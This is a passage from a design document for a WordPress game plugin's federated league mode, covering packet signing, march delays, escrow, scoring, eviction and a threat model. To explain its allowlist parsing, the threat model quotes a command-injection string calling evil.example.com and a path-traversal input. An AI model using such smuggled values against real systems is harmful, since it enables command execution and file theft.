The unique index is on `(peer_id, uuid)`, which is what makes replay impossible rather than merely
unlikely, and the row is written in the same guarded statement that applies the effect.

A staged packet is readable in the admin before it fires. That is worth having: it lets an
administrator see an incoming march, and it makes a disputed result reviewable afterwards.

### Computing the delay

**Whole days, drawn by the receiver, stored as an absolute instant.**

    $days = random_int(3, 8);                       // CSPRNG, not rand()
    $process_after = gmdate('Y-m-d H:i:s', time() + $days * DAY_IN_SECONDS);

Three decisions sit in those two lines.

**The receiver draws it, not the sender.** A sender that chooses its own delay chooses when the
battle resolves, and therefore what the defender will have standing when it lands. That is the one
piece of the fight an attacker must not control. It also must not be derived from anything in the
packet, or a sender can grind UUIDs until the delay suits them: `random_int()`, seeded by the
system, nothing else.

**Store UTC, display local.** The delay is a duration, and durations have no timezone. Keeping
`process_after` as an absolute instant means it survives a site changing timezone, a member in
another country, and daylight saving, none of which should move a battle. The timezone belongs at
the point of display, where a player reads "expected within the week" and an administrator reads a
local date.

That separation is the lesson from the local game: the daily grant broke precisely because an
absolute cron instant and a local calendar day were treated as the same thing.

**Whole days, not hours.** Because packets are processed by the daily tick, a delay of three days
and seven hours and a delay of three days both resolve at the same moment: the next daily run.
Storing the hours would suggest a precision the game does not have.

### Which tick processes it

**The daily one.** Results landing at one predictable moment each day is the BRE ritual: you log
in, and the dispatches from three days ago are waiting. Spreading them across the hourly tick
would make them arrive whenever, which is more responsive and less of an event.

The hourly tick stays a safety net: if a daily run is missed, anything overdue is picked up rather
than waiting another full day.

With the daily tick at local midnight, a league result lands overnight and is there when a player
next logs in, which is exactly the feel worth having.

### What each side is allowed to know

A round trip is therefore six to sixteen days: the march out, the battle, and the result coming
home. With the muster window in front of it, eleven to twenty-one from the moment the war is
called. Against a 45-day round that is a handful of league exchanges at most, which is the intended
weight. A league that wants more per round shortens the range rather than the round.

The attacker knows the range, three to eight days, and never the draw. Waiting without knowing is
the mechanic, not an absence of one.

The defender should know less still, and this is worth stating because the staging table makes it
easy to get wrong: **a staged war packet must not show the defending side what is coming**. An
administrator who is also a player would otherwise read the force composition out of the admin
screen and reinforce against it, which is not a cheat so much as an invitation.

So the admin view of an inbound war packet shows that one exists, which peer sent it and roughly
when it is due, and nothing about its contents until it has been processed. Results and news
packets carry no such advantage and can be read freely.

### What comes home

Losses follow the local rules, applied to what was committed. Send ten ballistae legions and a
hundred legionnaires and pawns, lose the battle, and what returns is what survived at the losing
side rate, not the force that set out. Win, and the lighter winning rate applies. The same maths
as a local march, over a force assembled from several empires instead of one.

Spoils use the local raid percentages, listed under the war section: gold, grain and iron from the
defending side, siege weapons as captured equipment, and prisoners who become peasants. Land never
moves. Every number a result packet asserts is clamped to what the receiving site independently
believes possible.

## League mode changes the local game

**When a site joins a league, empires on that site stop warring with each other.** All war becomes
league war: the site is a team, and the enemy is another site. Local marches, local raids and local
sieges are simply unavailable while the league is enabled.

This is the right call, and it is worth being clear that it is a different game rather than the
same game with an extra feature. Two empires that were rivals on Monday are contributing to the
same army on Tuesday, and most of the local design has to be read again in that light.

### What follows from it

**The War Room becomes a mustering hall.** Instead of choosing a neighbour and committing a force
against them, a ruler commits a force to the site's next march. The same force array, the same
maths, a different target and a shared outcome.

**Land only grows by settling.** Conquest was the answer to the exploration curve: past a certain
size, taking acres from a neighbour is cheaper than finding them. With local war gone, exploring is
the only source of land, and it gets steadily more expensive. Nobody loses land either, so the
whole site grows slower and more evenly. That is probably fine, and possibly better, but it wants
watching in a round: if land stalls entirely, the fix is the explore curve, not reinstating local
war.

**The target band, the crown truce and the hits-per-day limit go quiet.** They govern who may
attack whom locally, and locally nobody may. They stay in the settings because leaving a league
brings them back, but they should not be shown as if they applied.

**The market matters more, not less.** Trading with people who are now allies is straightforwardly
good, and it is the main way a site can concentrate resources into the empires best placed to field
an army. It stays exactly as it is.

**Rankings keep net worth and gain a contribution column.** Net worth still measures how well
somebody plays; it stops being a target list. What a ruler contributed to the site's marches is the
other thing worth seeing, and it is the honest measure of whether somebody is carrying the team or
riding it.

### Covert work, which is the interesting one

Spying on an ally makes no sense, so agents should not operate inside the site while the league is
on. Spying on a *rival site* makes a great deal of sense, and the packet design already supports
it: reconnaissance is a small signed packet with a small signed answer, and it fits the same
staging, delay and rate limiting as everything else.

That would make an agent a scout for the league march rather than a weapon against a neighbour, and
it gives the enormous cost of one a clear purpose: knowing what is waiting on the other side before
a site commits an army for a fortnight. Recommended, but a decision rather than a given.

### Turning it on and off

Enabling league play changes the rules under players who planned around the old ones, so it takes
effect the same way league settings do: **at the next round boundary**. Leaving a league restores
local war the same way. A site does not flip between the two games mid-round.

## The league table: what a score can honestly be built from

Players need somewhere to see how their site is doing against the rest of the league, and it is the
screen that makes a league feel like one rather than like a series of unrelated raids. It is also
the screen with the sharpest design problem in Phase 2, because every number on it came from
somewhere, and half of those somewheres are sites with an interest in the answer.

### The rule the page is built on

**Rank on what was witnessed. Display what was asserted, labelled as an assertion.**

A league exchange is witnessed by two sites. The defender computes the battle and signs the result,
the attacker applies it and holds the same signed document, so both sites end up with identical,
independently-held records of what happened. That is the only class of fact in the league that a
single site cannot fabricate alone.

Net worth, empire count and every other figure a site publishes about itself is the other class: a
claim signed by the claimant. Signing proves it came from that site unaltered. It proves nothing
whatever about whether it is true.

There is a third way to learn something about a peer, and it is the one that gives the enormous
cost of an agent a purpose: scouting. A reconnaissance packet returns a figure the target did not
choose to publish, which is worth more than anything on this page precisely because it was not
volunteered. The league table is what everybody knows; an agent is how a site finds out what it is
actually marching into.

So the league table ranks on war record, which is corroborated, and shows wealth as context with
the date it was claimed. Ranking sites by self-reported net worth would be handing every member a
slider labelled "my position", and the first league to notice would be the last one anybody
enjoyed.

### The site standings

The table every player sees, ordered by league score:

| Column | Where it comes from |
| --- | --- |
| Site | the roster |
| Score | computed here, from exchanges this site holds records of |
| Won / lost | marches won, marches lost, defences repelled, defences broken |
| Spoils | gold, grain, iron and engines taken, net of what was lost |
| Empires | claimed by that site, with an as-of date |
| Net worth | claimed by that site, with an as-of date |
| Last heard | the date of its most recent packet |

Wealth columns are visibly a different kind of thing from the record columns: dimmer, stamped, and
never sorted on by default. The page says once, in plain words, that the last two columns are what
each site says about itself.

### Scoring

Points come from exchanges, and the shape matters more than the constants:

- **Winning a march** scores, scaled by the size of the force that stood against it. Beating a
  garrison scores less than beating an army.
- **Repelling a march** scores on the same scale. A league that only rewards attacking teaches
  every site to empty its garrison, and then the only skill is guessing who marched this week.
- **Losing** scores nothing. Not negative: a site that keeps fighting and losing should sit at the
  bottom of the table rather than below zero, and a negative score is an invitation to work out
  whether arranging a defeat for somebody else is worth more than winning yourself.
- **Repeat exchanges with the same peer decay within a season.** The second march on the same site
  is worth less than the first, the third less again. Without this the dominant strategy is to find
  the weakest member and farm it, which is both the most boring way to win a league and the fastest
  way to lose a member.

Every constant here is a league setting published in the ruleset, so every site computes the same
table from the same records, and a site running different numbers is visible as a fingerprint
mismatch the way any other rule divergence is.

### Each site computes its own table, and they may differ

There is no central scorekeeper. The hub holds the ruleset and the calendar and explicitly does not
arbitrate outcomes, and that rule does not get bent for a leaderboard. Each site builds the table
from the packets it holds: every exchange it took part in, plus what peers have published about
exchanges it did not.

This means two sites can show slightly different tables, usually because one has not yet heard
about an exchange between two other members. That is honest and should be said on the page, not
hidden: the table is the standings **as this site has heard them**, with the date of the most recent
packet that informed it. A leaderboard that quietly presents partial information as authoritative is
worse than one that admits what it is.

### Disagreement is the cheat detector

Because both parties to an exchange hold the same signed result, a site can check every peer's
published record against its own for the exchanges they shared. A member claiming a victory over
this site that this site's records show as a defeat is not a rounding difference. It is either a
bug or a lie, and either way somebody needs to look.

So the League screen flags disagreements rather than silently preferring one version: which peer,
which exchange, what each side says. This is the evidence that makes eviction a decision rather
than a suspicion, and it is a natural consequence of the design rather than a feature bolted on.

It has a real limit worth stating. A site can only check exchanges it was in. Two members colluding
to publish matching lies about a battle between themselves cannot be caught this way by anybody,
and no amount of cryptography fixes that, because both signatures are genuine. What limits the
damage is that collusion is only worth doing for score, score decays on repeat exchanges with the
same peer, and the league is small enough for a pair of sites trading improbable victories to be
noticed by people. The honest statement is that the protocol catches contradiction and people catch
collusion.

### What the league table must never show

**Nothing about a march in flight, and nothing about an open muster anywhere.**

This is the one place where the score page could quietly destroy the best mechanic in the design. A
league table that showed open musters would be an early-warning system: a site could watch the
league, see an army being raised, and know to keep its legions home. The attacker commits blind and
the defender is met by whatever happens to be standing, and both of those stop being true the moment
this page is helpful about it.

So a site's own muster is public **on that site only**, and never travels in a news packet. The
league table shows exchanges that have completed. The oldest rule in this document, that a staged
war packet must not show the defending side what is coming, applies with equal force to a
leaderboard.

### News packets, specified

The score page is the reason to pin down what a site publishes about itself, which the rest of this
document has referred to without defining.

    league        league id, ruleset fingerprint
    site          site id, name, round id, round day
    claimed       empire count, total net worth, largest empire net worth   (self-reported)
    record        per peer: marches sent, won, lost; defences repelled, broken;
                  spoils net, by resource                                   (corroborated)
    status        under grace until, accepting marches or not
    as_of         the moment the site read its own database to build this

Sent on a schedule rather than on demand, daily by default, to every member. It carries no player
names, no empire names, no per-empire figures, and nothing about musters, marches in flight or
intentions. A news packet is a site describing its own past, never its present and never its plans.

It is rate-limited like everything else, and a member sending them faster than the schedule is
noise at best. Because it is the packet that arrives most often, it is also the one most worth
fuzzing when the receiver is tested: every field parsed, clamped and range-checked before it is
stored, and a news packet that fails any of that is staged for an administrator rather than
applied, exactly as a war packet would be.

### The player's view

A page, `[ido_league]`, titled **Imperial Dominion - League**, created only when league mode is on
and removed from navigation when it is off. It carries, in this order:

1. **This site's standing**: position, score, record, and what it has taken and lost this season.
2. **The open muster**, if there is one: the target, the window, who has pledged, and a link into
   the War Room, which is where a force is actually committed. This is the call to action and it
   belongs above the table, but the committing happens in the mustering hall like every other
   order that costs turns.
3. **The site standings**, paged. At the 254-site ceiling this table has to page rather than render
   every row, and it defaults to showing the sites this one has actually fought.
4. **This ruler's own league record**: marches joined, forces committed, spoils earned, survivors
   returned. The personal column, and the reason a player reads the page twice.
5. **Recent exchanges across the league**, as a feed, which is the part that makes the league feel
   inhabited: who marched on whom, and how it went.

Empires are not ranked league-wide. A cross-league table of six thousand empires would rank players
on self-reported figures from sites they have never fought, which is the exact thing the site
standings refuse to do, and it would quietly turn a team game into a solo ladder. Rulers compete on
their own board and contribute to their site's position, and that is the shape of the game.

### At the end of a season

The league champion is the site at the top when the league round closes, and it goes into the Hall
of Fame with the league's name, the season, the final table and the ruler on each site who
contributed the most to it. The Hall of Fame is local and permanent, so the record survives the
league itself dissolving, which leagues do.

## The League screen

A single admin page under Imperial Dominion, and the one place a game master manages all of this.

**When no league exists**, it offers two things: found a league, or join one with an invitation.
Founding asks for a name, a member cap defaulting well below the recommended 20, the ruleset it will
publish, the round calendar and the delay range. Joining asks for the invitation blob and nothing
else, since everything else arrives with it.

**Once in a league**, the page shows what a game master actually needs:

- the league name, whether this site is the originator, and the ruleset version in force
- the member list with each site's URL, status, last contact and rules fingerprint match
- pending enrolments awaiting approval, for an originator
- the invitation generator, showing a token once and never again
- the packet queues, inbound and outbound, with what is due and when
- the open muster if there is one: the target, who has pledged what, and when the window closes
- the next march: what has been committed so far, by whom, and against which site
- a kill switch that stops sending and accepting without deactivating the plugin

The screen carries the same protections as the rest of the admin: `manage_options`, a nonce on
every form, and no secret ever rendered after the moment it is created.

## Tracking what each empire contributed

A march is assembled from several empires and resolved days later, so the site has to remember
exactly who put in what. Without that record there is no way to return the right survivors to the
right ruler, no way to split spoils fairly, and no way to show who carried the effort.

    ido_league_marches        id, league_id, peer_id, direction, status, packet_uuid,
                              committed_at, sent_at, resolved_at, outcome, spoils_json
    ido_league_contributions  id, march_id, kingdom_id, committed_json, returned_json,
                              spoils_gold, spoils_grain, spoils_iron, spoils_equipment

`committed_json` is the force as it left, by unit type. `returned_json` is what came home, written
when the result lands. Until then the difference is the escrow, and it is the reason an empire
shows fewer troops at home.

### Splitting the result

Survivors, casualties and spoils are all shared **in proportion to what each empire risked**, which
is the only split that cannot be argued with: contribute a tenth of the army, carry a tenth of the
losses, take a tenth of the plunder.

The awkward part is that proportions are fractional and troops are not. Splitting 97 surviving
legionnaires between three empires by naive rounding either invents a soldier or loses one, and
doing that every march, on every unit type, on gold and grain and iron as well, drifts into real
money. So the distribution uses largest-remainder allocation and **the total distributed is
asserted to equal the total received**, per unit type and per resource. A march that cannot
reconcile is held for an administrator rather than applied approximately.

Equipment is the same problem with sharper edges, because captured siege weapons come in ones and
there may be fewer of them than contributors. They go by largest remainder too, and the tie is
broken deterministically, by contribution and then by empire id, so the same result never depends
on the order rows came back in.

An empire reduced to nothing by a league defeat is covered in
[RUINED-EMPIRES.md](RUINED-EMPIRES.md): zero is a hard floor, and an empire below a threshold is
restored to the founding package once a round rather than left to grind back.

### When the contributor is not there any more

An empire can be deleted, or its ruler can walk away, while its army is a week out. The escrow
still exists and something has to happen to it.

Survivors belonging to an empire that no longer exists are disbanded and its share of the spoils is
forfeit, announced in the gazette. The alternative, redistributing to the remaining contributors,
quietly rewards the site when a player quits, and anything that pays a site for losing a player is
worth refusing on principle.

### What a player sees

A ruler whose legions are away must be told so, plainly, on the Army screen: what is committed,
where it went, and that it is expected back within the window. An army that silently vanishes from
the muster for a fortnight is indistinguishable from a bug, and it is the first thing anyone will
report.

## Marches and the end of a round

This is the consequence that changes the calendar. A round trip is three to eight days out and the
same back, so an army can be away for sixteen days. A round is forty-five. A march begun on day
forty cannot possibly resolve before the wipe.

So a league **closes marching before the round ends**, by the worst case from the call to the
return, calculated from the settings rather than written down as a fixed number: the muster window
plus twice the maximum delay. With a five day muster and a three to eight day range that is the
last twenty-one days, and what closes is the calling of a muster rather than the marching, since a
muster called on the last permitted day still has to raise an army before anything leaves. Narrow
either setting and the cutoff narrows with it. The last stretch
of a round becomes what it should be anyway, the part where sites consolidate and the standings
settle, rather than a window where armies are committed and then deleted mid-flight.

Anything still in flight when the round does end is resolved if it can be, and otherwise returned
to the contributing empires immediately before the wipe, so nobody loses an army to the calendar.
That matters more than it sounds: the alternative is a player whose last act of the round was to
contribute, and whose reward was to watch it disappear.

## League rounds need to be longer

A local round of 45 days works because a local march resolves instantly: a ruler can fight on the
last afternoon of the round. A league march cannot. Three to eight days out, a battle, three to
eight days home, and marching has to close a full round trip before the wipe or armies are deleted
in flight.

The arithmetic is unkind:

| Round | Marching closes | Marching window | Sequential exchanges at ~11 days |
| --- | --- | --- | --- |
| 45 days | day 29 | 29 days | about 2 to 3 |
| 60 days | day 44 | 44 days | about 4 |
| 90 days | day 74 | 74 days | about 6 to 7 |

Two or three exchanges is not a season. It is barely a conversation: one march, one reply, and the
round is over before anyone has answered the reply. The wasted tail is worse in proportion too, at
sixteen of forty-five days, better than a third of the round, against under a fifth of ninety.

**The recommendation is 90 days for a league round**, set by the originator with the rest of the
calendar, while a site playing alone keeps 45.

### Why a longer round is safer in league mode, not riskier

The usual objection to long rounds is that a latecomer walks into a world of entrenched empires
and gets farmed by neighbours who have had six weeks to grow.

**League mode removes that objection**, because it removes local war. Nobody on your own site can
attack you, so joining late means building quietly and contributing to the next march rather than
being somebody's target practice. The thing that made long rounds punishing is exactly the thing
league play switches off.

What remains is that a latecomer will finish lower in the standings, which is true of any round of
any length and is what the next one is for.

### Derive the cutoff, do not hardcode it

The twenty-one day close is the muster window plus two times the maximum delay, and it should be
calculated that way rather than written down. A league that narrows its range to three to five days
gets a fifteen day cutoff for free, and one that widens it to a fortnight gets a thirty-three day
cutoff without anyone having to remember to change a second number.

    $cutoff_days = $league['muster_days'] + 2 * $league['delay_max_days'];

Both terms have to be in it. Leaving the muster out is the easy mistake, and it produces a cutoff
that looks right and still lets a site call a war whose army departs after the round has ended.

### The one that still needs deciding

Whether a site can change round length while a league is running. The honest answer is no: the
league owns the calendar, members wipe together, and a member running a different length is a
member playing a different game. Changing it should take effect at the next boundary, like every
other league setting, and should be the originator's to change.

## A board reset, and the grace period that follows

An empire reduced to nothing is covered in [RUINED-EMPIRES.md](RUINED-EMPIRES.md). This is the
harder case: **a whole site beaten flat**, every empire on it in ruins, with nothing left to build
from and no realistic way back inside a round.

A game master can reset the board: the site starts over as if freshly installed, every empire
refounded with the starting package, the round restarted, and the Hall of Fame left intact so the
history is not rewritten. Only for a site that is genuinely finished, not as a way out of a bad
week.

### The grace period

A reset board then gets **X days in which it cannot be attacked**, so its players can rebuild
before anybody arrives. Without it a reset is pointless: the site that flattened them is still
strong, still in range, and would simply do it again on day one.

The grace period is a setting, and it applies to **local and league play alike**.

### League play has to honour it, and prove that it does

This is the part that needs care, because the attacking site decides to march days before the
defending site sees the packet. A march committed in good faith can land on a board that reset
while the army was in transit.

**The defending site refuses the march and sends everything home.** The result packet carries the
force back intact, with no casualties and no spoils, and a plain reason: the board is under a
grace period until a given date. The attacker loses the turns they spent and the days the army was
away, which is the correct price for bad timing, but not the army.

Refusing in this way has to be indistinguishable, to the attacker, from an ordinary result packet
arriving. It is a normal outcome, not an error, and the message says so.

A site under grace may not march either. Protection is not a shield to attack from behind, which
is the same rule the local crown truce already follows.

## How many players, and how many sites

**Twenty-five empires to a site.** Beyond that a board stops being a place where people know each
other, and the top of the table stops being reachable for anyone joining late.

**Up to 254 sites in a league.** That number comes from the inter-BBS games this one descends from,
where a node id was a single byte, and it is a sensible hard ceiling to keep.

The earlier note in this document recommended a maximum of 20, and both things can be true: 254 is
the ceiling the software enforces, while the number a league should actually run is far smaller.
The reasoning has not changed. Secrets stay linear, and traffic follows participation rather than
membership, so the limit is not technical: it is that a league is held honest by administrators who
notice when a member's numbers look wrong, and nobody reads a standings table spanning two hundred
sites. Eight to twelve remains the recommendation for a first league. The originator sets the cap,
and the software will not stop them at 254.

At the ceiling that is 254 sites times 25 empires, so a league-wide standings table has to page
rather than render six thousand rows.

## Evicting a member

The member list is already specified. What was missing is how a league removes somebody caught
cheating, and it needs to be explicit rather than improvised, because it will be used in anger.

**Only the originator can evict**, and it takes effect immediately:

- the member's secret is destroyed, so nothing it sends will verify again
- packets already staged from that member are discarded, since they were authored under the same
  suspicion
- armies from other sites currently in transit toward it are returned intact, the same way a grace
  period returns them
- the remaining members are told, once, with the reason recorded

**What eviction does not do is rewrite history.** Spoils already taken stay taken and standings
already recorded stand. Unwinding a season on suspicion would cause more argument than the
cheating did, and the evidence for cheating in a federated game is rarely clean enough to justify
it.

A member evicted in error can be re-invited: it is a new enrolment with a new secret, not an undo.

## The goals, and two mechanics they imply

The original statement of the game reads: keep your population content, maintain a military large
enough to defend your empire, balance size and strength, and attack, trade with and make alliances
with other rulers.

Two of those are not in the game yet, and both are decisions rather than oversights.

**Population contentment does not exist.** Peasants grow toward the housing available and starve
when grain runs out, and that is all. A contentment mechanic, where taxes, war and food affect
whether people stay, would give the economy a second dimension and a reason to care about more
than capacity. It would also be a substantial addition, and it should be judged after a round has
been played rather than added because the sentence mentions it.

**Alliances were deliberately excluded** from Phase 1, and league play arguably replaces them: in a
league the whole site is an alliance, which is a cleaner answer than factions within a board. If
local alliances are still wanted, they belong in local play only, since in league mode the site is
already the team.

## Threat model

Written for review rather than reassurance. Where something cannot be defended, it says so.

**None of what follows is a promise that this is safe.** It is a description of what has been
thought about and what has not. The plugin is provided without warranty and is run at the site
owner's own risk; a threat model is a statement of intent and reasoning, not a guarantee, and new
vulnerabilities are found in software every day. Anyone enabling league play is opening their site
to traffic from other sites, and should decide that deliberately.

### What we are protecting

The WordPress installation first: remote code execution or database access through this endpoint
would be far worse than any amount of cheating. Then the shared secrets, then game state, then
availability. A league is a game; the site may not be.

### Trust boundaries

1. **Internet to endpoint.** Unauthenticated by design. Anyone can send bytes.
2. **Peer to game logic.** Authenticated, but a peer can be hostile or compromised.
3. **Hub to member.** The hub sets rules; it must not be able to reach further than that.
4. **Player to their own site.** Ordinary WordPress surface, unchanged by league play.

### Risks and what answers them

**Unauthenticated request handling.** The route is public, so every defence before the signature
check runs on attacker-controlled input.

- Reject on length before anything else, from `Content-Length` and again from the actual body.
- Order of operations is a security property: length, peer lookup, HMAC, parse, schema, apply.
- **Write nothing before the signature verifies.** Logging raw bodies to the database ahead of
  verification hands an anonymous attacker a write primitive, and a disk-filling one at that.
  Counters may increment; content may not be stored.
- `hash_equals()` only. Generic responses: a handler that distinguishes "unknown peer" from "bad
  signature" is an oracle.
- Rate limit per IP and per peer, and cap queue depth per peer.
- Register the routes **only when the site has joined a league**. A site not playing should not
  have the surface at all.

**Server-side request forgery.** The sharpest risk in the design, and it is not in the packet path
at all: it is in enrolment and in sending. Our site takes a URL from a remote party and fetches it.

- Peer URLs must be HTTPS and must resolve to public addresses. Refuse loopback, link-local
  (169.254.0.0/16, and cloud metadata at 169.254.169.254 in particular), RFC1918, CGNAT, and the
  IPv6 equivalents.
- Re-check after DNS resolution rather than on the string, and disallow redirects, or re-validate
  every hop. DNS rebinding is the obvious follow-up attack.
- Use `wp_safe_remote_post()` rather than `wp_remote_post()`, since it applies WordPress's own host
  validation, and never disable `sslverify`.
- An administrator approves every peer before anything is fetched in anger, which is the real
  control; the rest is defence in depth.

**Signature scope.** A MAC over the wrong bytes is worse than none, because it looks correct.

- Everything security-relevant sits inside the signed payload: sending site, **receiving** site,
  league id, packet UUID, sequence, timestamp, packet type, ruleset fingerprint, body. A packet
  signed for one peer must not verify at another, and a war order must not be replayable as a
  result.
- The algorithm is hard-coded. No `alg` field, ever: letting a packet name its own algorithm is how
  JWT implementations were broken.
- Keys from `random_bytes()`, one per pairing, rotated with an overlap window.

**Parsing.** The specification lives in `IDO_League_Packet`, one declared field at a time, with a
type and a range for each. Three properties of it are worth naming, because each answers a different
attack:

- **An undeclared field is an error, not something ignored.** Ignoring lets an attacker add fields
  and watch for a change in behaviour, and makes a version mismatch fail silently rather than
  clearly. The validated array is also rebuilt from the specification rather than passed through, so
  nothing undeclared survives even by accident.
- **A packet type with no specification is refused.** `war` and `result` are designed and not yet
  built, so a packet claiming to be one is turned away. A handler that accepts a type it cannot
  validate is worse than one that admits it does not know the type yet.
- **Types are checked, not coerced.** `is_int()`, not `is_numeric()`: the string `"14"`, the float
  `14.5` and `true` are all refused where a number belongs. A peer sending a string where a number
  goes is running different code, which is worth knowing rather than papering over.

Text fields face an allowlist rather than a denylist, and that distinction was earned: the first
version banned the characters that only appear in attacks, which let
`Northmarch && curl http://evil.example.com` and `../../../../etc/passwd` through, since neither uses
a character anybody thinks to ban. A denylist answers "is this one of the bad things I thought of";
an allowlist answers "is this a name".

Dates are matched against a fixed shape and never handed to `strtotime()`, which would cheerfully
accept `now`, `+1 year` and `tomorrow` from a peer.

Decoding is private and reachable only through `IDO_League_Crypto::open()`, which verifies first.
The order of operations is the security property, so it is enforced by the class rather than
described in a comment above two public methods.

`json_decode` with depth and size caps, associative mode, never `unserialize()`.
Whitelist every field and reject unknown keys. Nothing from a packet becomes a filename, a path, a
shell argument, a SQL fragment or an included file. If compression is ever accepted, cap the
decompressed size, because a compression bomb is trivial otherwise.

**Second-order injection.** Packet strings become empire names in the gazette and in reports.
Validate on the way in against the same character rules a local name gets, and escape at output.
The dangerous version is a name that is harmless in a battle report and hostile in an admin screen.

**Business logic, which is where the real exploits will be.**

- *Replay*: recorded UUID, and the record written in the same guarded statement that applies the
  effect, not before it and not after it.
- *Concurrency*: two packets for one escrow arriving together. The named lock plus a guarded
  `UPDATE ... WHERE` is what makes double release impossible; an idempotency key alone is not
  enough under a race.
- *Forged results*: a hostile defender reports that the attacker lost everything. The attacking
  site clamps any result to what it actually escrowed and to what the ruleset makes possible. Never
  apply a number a packet asserts; apply the smaller of the asserted number and the local ceiling.
- *Timeout gaming*: force a result to be late, collect the escrow on timeout, then have the result
  land anyway. Escrow release is idempotent and keyed by escrow id, so the second one is a no-op.
- *Malicious hub*: ruleset values are range-checked on arrival. A hub that pushes a million turns a
  day is refused by the member, not obeyed.

**Denial of service.** Per-peer rate limits, queue caps, a maximum stored packet age, and a kill
switch: one setting that stops accepting and sending without deactivating the plugin.

### Residual risk, stated plainly

- **A compromised member site owns its own game state.** No protocol fixes that. Detection is the
  plausibility checks and public standings, not prevention.
- **WordPress has no secret store.** A shared secret is readable by anything with database access,
  which includes every other plugin on the site. Rotation and per-pairing keys limit the blast
  radius; they do not eliminate it.
- **The endpoint is a public attack surface** that would not otherwise exist. The mitigation with
  the best ratio is simply not registering it unless the site is in a league.

### Before it ships

Fuzz the handler with malformed, truncated, oversized and deeply nested bodies, and with valid JSON
carrying hostile values. Review the order of operations specifically. Confirm that no write of any
kind happens before verification. Test key rotation with packets in flight, since that is the path
most likely to be wrong and least likely to be exercised.

## Gaps: what this design has not answered

Everything above is settled enough to build from. What follows is not, and is written down so it
is found deliberately rather than discovered halfway through an implementation. Roughly in the
order they would hurt.

### 1. Who pays on the defending side

This is the largest hole, and it contradicts a rule stated earlier in this document.

*Only what is committed is at risk* says empires opt in by committing, and that an empire which
sends nothing neither gains nor loses. That is coherent for the attacker, who chooses. It cannot be
true for the defender, who does not: a defence is whatever happens to be standing on the day the
packet lands, assembled from empires that made no decision at all. Yet spoils are taken from "the
defending side", and somebody's gold leaves.

So the unanswered question is exactly *whose*, and there are three candidate answers:

- **Everyone on the site, in proportion to what they held.** Simple, and it makes defence a shared
  civic burden. It also means a ruler who logs in to find their treasury lighter because two other
  sites had a war, which is the failure mode the opt-in rule was written to prevent.
- **Only empires with troops standing.** Rewards keeping a garrison with the right to be robbed,
  which is backwards, and it means the safest thing a defender can do is hold no army at all.
- **In proportion to each empire's share of the defence that actually fought**, with losses and
  the plunder both falling there. Closest to consistent with the attacker's rule, and it makes
  garrisoning a real decision with a real cost.

The third is the most likely right answer, and it needs one more decision inside it: what happens
to an empire that held nothing back and contributed everything to its own site's muster. It
defended with nothing, so it loses nothing, which reads as a loophole until you remember its army
is a week away and at risk elsewhere. That may be fine. It needs thinking about rather than
assuming.

**Defence also needs to pay.** The league table scores a repelled march, but nothing says what the
defending *empires* get. If repelling is purely a cost, the dominant play is to keep nothing home.
A share of the attacker's casualties as salvage, or captured engines from a broken assault, would
make a garrison worth keeping.

### 2. Numbers that are referred to but never set

Each of these is currently a phrase where a value has to be:

- **The escrow timeout.** "Released with a timeout if it never does" appears three times with no
  number. It is security-relevant, not cosmetic: too short and a slow peer causes a double release,
  too long and an army is hostage to a dead site. It has to be derived from the settings rather
  than typed, something like the outbound delay plus the inbound delay plus a margin, and the
  release must stay idempotent so a result arriving afterwards is a no-op.
- **What league actions cost in turns.** Calling a muster costs "more than any local order",
  contributing costs "a small number". Both belong in the league ruleset, since a site that made
  them free would be buying exchanges.
- **The minimum force a muster must raise** to march rather than fail.
- **The scoring constants**: what a win is worth, how the decay on repeat exchanges works.
- **Packet size and rate limits**, which the threat model names without quantifying.

### 3. The round boundary needs an absolute instant, not each site's midnight

The league owns the round calendar, and delays are carefully stored in UTC for exactly the right
reasons. But a round boundary in the local game is a local midnight, and members in different
timezones are up to a day apart. Sites would wipe on the same *date* and not at the same *moment*,
so for most of a day one site is playing a fresh round while another is still finishing the old
one, with league packets crossing between them.

The league round has to start and end on a single absolute instant published in the calendar, with
each site displaying it in local time. This is the same mistake as the daily turn grant, which
broke because an absolute cron instant and a local calendar day were treated as the same thing, and
it will be made again here unless it is written down.

### 4. Restoring a database breaks the protocol

Sequence numbers are per sending site and monotonic, and UUIDs of processed packets are recorded.
An administrator restoring last week's backup, which is an ordinary thing to do after an unrelated
problem, rolls both backwards: the restored site re-sends sequence numbers its peers have already
seen and will refuse, and it has forgotten packets it already applied, so a peer's retry will be
applied twice.

Nothing in the design notices this. What it needs is an epoch alongside the sequence number,
changed whenever a site detects that its own state has gone backwards, and a documented recovery
path that is a re-handshake rather than a silent resync. Both sides should be told what happened,
because the alternative is a member that quietly stops being able to play and nobody knows why.

### 5. What happens when the originator disappears

The hub holds the ruleset and the calendar, and a hub that is down merely pauses administration.
A hub that is *gone*, because the administrator lost interest or the domain lapsed, leaves a league
that can still fight but can never change a rule, admit a member, evict a cheat or end a season.

Leagues outlive their founders' enthusiasm, so there should be a succession: a nominated second
site, or a majority of members agreeing to promote one. This is worth designing before it is needed
rather than during an argument about it.

### 6. Scouting is recommended and unspecified

*Covert work, which is the interesting one* proposes reconnaissance packets and stops there. If it
is built, it needs the same treatment as everything else: what it costs, what it returns, what a
target may refuse to answer, and above all whether a scouting *reply* can lie. It can, being
self-reported, which makes a scout report worth exactly as much as the league table unless the
answer is constrained to things the receiving site can sanity-check.

There is a sharper question underneath. A scout report that is accurate defeats the blind commit
this whole design is built around. One that can be wrong preserves it. The interesting version is
probably a report that is accurate *as of days ago*, which is useful and still not knowledge.

### 7. Smaller things, listed so they are not forgotten

- **A site joining mid-season** has no league record and starts at the bottom of a table it could
  not have competed in. Whether a late joiner is scored, unranked, or provisional is undecided.
- **Grace periods and the table.** A site under grace cannot fight; whether it still publishes news
  and appears in the standings is unsaid.
- **What the defending players see, and when.** The attacker's experience is described in detail.
  The defender's is not: whether a repelled march is news, how a ruler learns their garrison fought
  overnight, and what the gazette says.
- **Two-site integration testing.** The threat model calls for fuzzing the handler, which is the
  security half. The other half is a harness that runs two installs and puts a real exchange
  through both, and that is the only way the escrow, the delay and the settlement get exercised
  together before a league does it for real.
- **Leaving with an army in flight** is described for eviction and removal but not for a member who
  simply resigns mid-exchange.
- **The gazette and packet strings.** Second-order injection is covered; what is not decided is how
  much of another site's business appears in the local gazette at all.

## What Phase 1 already provides

- Combat resolution is one service (`IDO_Military::attack()`) that takes an explicit force array,
  so a remote force can be fed into the same maths without duplicating it.
- Resource and troop movement all runs through `IDO_Kingdom::pay()`, which is atomic and guarded,
  so escrow can be built on it rather than beside it.
- `IDO_Lock` gives a named lock for a critical section that spans several rows.
